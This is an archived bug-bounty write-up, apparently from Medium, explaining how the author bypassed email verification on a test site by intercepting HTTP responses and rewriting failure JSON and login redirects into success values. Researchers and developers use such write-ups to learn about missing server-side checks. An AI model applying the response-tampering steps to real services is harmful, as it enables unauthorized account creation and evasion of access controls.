---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-01-01_a-curious-case-from-little-to-complete-email-verification-bypass.md
original_filename: 2019-01-01_a-curious-case-from-little-to-complete-email-verification-bypass.md
title: A Curious Case From Little To Complete Email Verification Bypass
category: documents
detected_topics:
- otp
- sso
- access-control
- command-injection
- password-reset
- cors
tags:
- imported
- documents
- otp
- sso
- access-control
- command-injection
- password-reset
- cors
language: en
raw_sha256: ce8f3d30f1b92415163b6b6313e28cbdc2e30198ca006e42f2262d05fb352763
text_sha256: ad047333e402eeb8ac216075bdba11532a222bf6912abdc9e04398d2c7587a4a
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: true
---

# A Curious Case From Little To Complete Email Verification Bypass

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-01-01_a-curious-case-from-little-to-complete-email-verification-bypass.md
- Source Type: markdown
- Detected Topics: otp, sso, access-control, command-injection, password-reset, cors
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: True
- Raw SHA256: `ce8f3d30f1b92415163b6b6313e28cbdc2e30198ca006e42f2262d05fb352763`
- Text SHA256: `ad047333e402eeb8ac216075bdba11532a222bf6912abdc9e04398d2c7587a4a`


## Content

---
title: "A Curious Case From Little To Complete Email Verification Bypass"
url: "https://medium.com/@N0_M3ga_Hacks/a-curious-case-from-little-to-complete-email-verification-bypass-2c7570040e7e"
authors: ["Megaman (@N0_M3ga_Hacks)"]
bugs: ["Email verification bypass", "Broken authorization"]
publication_date: "2019-01-01"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5495
scraped_via: "browseros"
---

# A Curious Case From Little To Complete Email Verification Bypass

A Curious Case From Little To Complete Email Verification Bypass
N0_M3ga_Hacks
Follow
4 min read
·
Jan 1, 2019

227

2

Implementing a secure email verification mechanism is easy to mess up. A slight mistake in validation can lead to minor issues or vulnerabilities. However i am going to cover-up one recent case that i came across.

Upon entering the required details(First name,Last name,Email) an verification mail will be sent in order to verify the authenticity of the user. The structure of verification mail was as follows :-

https://yolosite.com/#/register/confirm/6135fbbf3e52effa1a04c6fc***REDACTED-SUSPECT-TOKEN***Visiting the link you will be presented to enter further details such as credit card information etc. Changing the value of token resulted in Confirmation link is invalid. which seems like the token is being validated. But on further inspection it was found that the JSON response body was culprit for the validation.

For example if the above link is being visited following will be the response :-

HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1000
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT
Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With, 

{"response":{"status":"success","externalID":null,"errors":[]}}

But if the token is being tampered(changed the first and last value) following will be the response :-

HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1000
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT
Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With, 
{"response":{"status":"failure","externalID":"7135fbbf3e52effa1a04c6fcf7e1dd426f2cdf36803f413481b62e2803b52dae","errors":[{"code":"1210","message":"Confirmation link is invalid"}]},"userStatus":null}

Initially i thought this might be happening because the token is partially correct so i decided to use a token which is completely random instead.So i forged the link as follows :-

https://yolosite.com/#/register/confirm/xxxxxxxxxxxxxxxxxxxxxxxx***REDACTED-SUSPECT-TOKEN***Below is the response :-

HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1000
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT
Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With
Connection: close
Set-Cookie: Cookies here;

{"response":{"status":"failure","externalID":"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx","errors":[{"code":"1211","message":"User not associated with this external id"}]},"userStatus":null}

I tried the forged link again but this time i decided to intercept the response and replace the above JSON with {"response":{"status":"success","externalID":null,"errors":[]}}

Get N0_M3ga_Hacks’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I was presented to enter credit card details. This was not the only endpoint which needs to be bypassed. It turns out that defense mechanism is only based on JSON responses and no server side validation is being done. However on further attempting to enter credit card details and clicking on Complete Registration following request and response is being initiated

POST /rest/services/public/register/full HTTP/1.1
Host: yolosite.com
Connection: close

{"externalId":"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx","locale":"en_IT","fullRegFields":{"card-alias-name-0":"Card-Name","card-numbers-0":"card-number","expiry-month-0":"MONTH","expiry-year-0":"2019","cvc-0":"cvc"}}

Below is the response of the above request

HTTP/1.1 400 Bad Request
Content-Type: application/json
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1000
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT
Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With
Connection: close
Set-Cookie: Cookies here;
{"status":"error","externalID":"","errors":[{"code":"0000","message":"An internal server error occurred"}]}

At this point it seemed like this is the actual endpoint which checks for token. Nonetheless i decided to forge the response again and the final response looks as follows :-

HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1000
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT
Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With
Connection: close
Set-Cookie: Cookies here;
{"response":{"status":"success","externalID":null,"errors":[]}}

As soon as the above response is forwarded i was presented to the login page.But it didn’t turned out as what i was expecting i tried to login and i wasn’t able to do so. I decided to investigate further.

When a verified user tries to sign in following will be the request.

POST /pkmslogin.form HTTP/1.1
Host: yolosite.com
Connection: close
Content-Type: application/x-www-form-urlencoded

username=username-here&password=***REDACTED***

And following will be the response :-

HTTP/1.1 302 Moved Temporarily
Content-Length: 1770
Content-Type: text/html
Location: https://yolosite.com/rest/services/public/lrr?TAM_OP=login_success&USERNAME=USERNAME-HERE&ERROR_CODE=0x38cf05e7&ERROR_TEXT=DPWWA1511I%20%20%20Login%20successful&URL=%2Fpkmslogin.form&REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.htm&HOSTNAME=yolosite.com&AUTHNLEVEL=
p3p: CP="NON CUR OTPi OUR NOR UNI"
Cache-Control: no-cache
Pragma: no-cache
Date: Sun, 04 Nov 2018 08:36:33 GMT
Connection: close
Set-Cookie: Cookies-here;

<html>
<P><A HREF="https://yolosite.com/rest/services/public/lrr?TAM_OP=login_success&USERNAME=USERNAMEHERE&ERROR_CODE=0x38cf05e7&ERROR_TEXT=DPWWA1511I%20%20%20Login%20successful&URL=%2Fpkmslogin.form&REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.html&HOSTNAME=yolosite.com&AUTHNLEVEL=">Click here</A> to fetch the resource.
</html>

Then i tried with an account which was not verified and below is the response

HTTP/1.1 302 Moved Temporarily
Content-Length: 1811
Content-Type: text/html
Location: https://yolosite.com/rest/services/public/lrr?TAM_OP=help&USERNAME=USERNAMEHERE&ERROR_CODE=0x13212079&ERROR_TEXT=HPDIA0121W%20%20%20The%20requested%20operation%20is%20not%20valid.&URL=%2Fpkmslogin.form&REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.html&HOSTNAME=yolosite.com&AUTHNLEVEL=
Connection: close
Set-Cookie: Cookies-here;

<html>
<P><A HREF="https://yolosite.com/rest/services/public/lrr?TAM_OP=help&USERNAME=USERNAMEHERE&ERROR_CODE=0x13212079&ERROR_TEXT=HPDIA0121W%20%20%20The%20requested%20operation%20is%20not%20valid.&URL=%2Fpkmslogin.form&REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.html&HOSTNAME=yolosite.com&AUTHNLEVEL=">Click here</A> to fetch the resource.
</html>

Again i tampered the above response and the final edited response looks as follows :-

HTTP/1.1 302 Moved Temporarily
Content-Length: 1770
Content-Type: text/html
Location: https://yolosite.com/rest/services/public/lrr?TAM_OP=login_success&USERNAME=USERNAME-HERE&ERROR_CODE=0x38cf05e7&ERROR_TEXT=DPWWA1511I%20%20%20Login%20successful&URL=%2Fpkmslogin.form&REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.htm&HOSTNAME=yolosite.com&AUTHNLEVEL=
p3p: CP="NON CUR OTPi OUR NOR UNI"
Cache-Control: no-cache
Pragma: no-cache
Date: Sun, 04 Nov 2018 08:36:33 GMT
Connection: close
Set-Cookie: Cookies-here;

<html>
<P><A HREF="https://yolosite.com/rest/services/public/lrr?TAM_OP=login_success&USERNAME=USERNAMEHERE&ERROR_CODE=0x38cf05e7&ERROR_TEXT=DPWWA1511I%20%20%20Login%20successful&URL=%2Fpkmslogin.form&REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.html&HOSTNAME=yolosite.com&AUTHNLEVEL=">Click here</A> to fetch the resource.
</html>

As soon as the above response is forwarded i successfully logged in to the account bypassing remaining checks. YAY.

Final Thoughts

Since i was able to bypass email verification completely i could have tried to sign up as @yolosite.com email but it was too late.
